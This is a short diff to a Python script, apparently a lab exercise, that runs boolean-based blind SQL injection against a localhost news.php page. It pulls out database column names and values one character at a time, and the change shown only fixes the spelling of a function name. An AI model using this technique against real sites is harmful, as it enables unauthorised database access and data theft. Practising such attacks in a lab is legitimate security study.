@@ -1,7 +1,7 @@
 import requests
 import string
 
-def condiccion_logica(condition):
+def condicion_logica(condition):
     r = requests.get("http://localhost/news.php", params={"id": condition})
 
     if "NOTICIAS" in r.text:
@@ -28,7 +28,7 @@ def extrae_nombre_columnas(max_columns=10, max_len=20):
                 {pos},1
                 ) = '{c}'
                 """
-                if condiccion_logica(condition):
+                if condicion_logica(condition):
                     name += c
                     break
 
@@ -57,7 +57,7 @@ def extrae_valor_columna(columna, max_rows=10, max_len=50):
                 ) = '{c}'
                 """
                 
-                if condiccion_logica(condition):
+                if condicion_logica(condition):
                     value += c
                     break
                 else:
